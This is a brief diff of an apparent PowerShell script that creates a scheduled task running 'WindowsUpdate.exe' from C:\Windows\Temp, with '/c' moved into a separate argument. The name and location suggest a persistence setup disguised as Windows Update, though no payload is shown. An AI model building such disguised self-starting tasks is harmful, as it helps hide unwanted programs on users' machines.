@@ -4,7 +4,8 @@ echo [+] Creating Task...
 
 #action
 $taskAction = New-ScheduledTaskAction `
-    -Execute 'WindowsUpdate.exe /c' `
+    -Execute 'WindowsUpdate.exe' `
+    -Argument "/c" `
     -WorkingDirectory "C:\Windows\Temp"
 
 #triggering
